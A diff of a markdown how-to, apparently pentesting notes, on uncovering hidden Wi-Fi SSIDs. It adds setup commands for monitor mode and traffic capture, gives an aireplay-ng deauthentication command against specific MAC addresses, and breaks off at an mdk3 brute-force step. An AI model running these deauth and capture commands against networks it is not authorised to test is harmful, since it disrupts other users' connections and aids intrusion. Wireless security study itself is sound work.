@@ -1,16 +1,36 @@
 # How to find hidden SSIDs
 Hiding SSIDs is a superficial attempt at masking SSIDs from casual users and attackers by making it less visible. 2 methods to get their ESSID, deauth and bruteforcing.
+## Setup
+Set router to max power
+```
+ifconfig wlan1 down
+```
+```
+iwconfig wlan1 txpower 30
+```
+```
+ifconfig wlan1 up
+```
+Preemptively kill everything that gets in your way:
+```
+airmon-ng check kill
+```
+Start monitor mode:
+```
+airmon-ng start wlan1
+```
+Save what's out there and save to a file:
+```
+sudo airodump-ng wlan1mon --band agp -w dump
+```
 ## Deauth
 If there are clients connected to hidden networks you can deauth them, then capture the request they send to re-connect which will contain the ESSID / network name. 
 
-Once setup, dump networks:
-```
-airodump-ng wlan1mon --band agp -w dump
-```
-Deauth target MAC:
+Deauth target MAC (found in dump):
 ```
 aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
 ```
+
 ## Brute forcing hidden SSID
 With `mdk3`, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names:
 ```
